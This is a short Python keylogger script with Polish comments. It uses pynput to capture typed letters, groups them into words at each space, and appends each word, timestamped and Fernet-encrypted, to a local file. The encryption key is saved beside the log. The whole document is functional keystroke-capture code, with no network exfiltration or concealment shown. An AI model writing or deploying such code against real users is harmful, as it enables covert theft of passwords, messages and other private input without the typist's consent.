from pynput import keyboard
import datetime
from cryptography.fernet import Fernet

key = Fernet.generate_key()    # Generowanie klucza szyfrowania
cipher_suite= Fernet(key)      #

with open('key.key', 'wb') as f:
    f.write(key)

buffer = []

def on_press(key):
    global buffer 
    if key == keyboard.Key.space:
        # szyfrowanie logów
        log = f'[{datetime.datetime.now().strftime('%Y-%m-%d, %H:%M:%S')}] {"".join(buffer)}\n'
        encrypted_logs = cipher_suite.encrypt(log.encode())
        with open('klogs.txt', 'ab') as f: # otwarcie pliku w trybie append binary
            f.write(encrypted_logs + b'\n')
        buffer = []
    else:
        try:
            if key.char.isalpha():  # check if the key is letter
                buffer.append(key.char)
            else:
                buffer.append(str(key).replace("'", ""))
        except AttributeError:
            pass # ignore non-character keys like Shift, Ctrl.
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False 
        
with keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
    
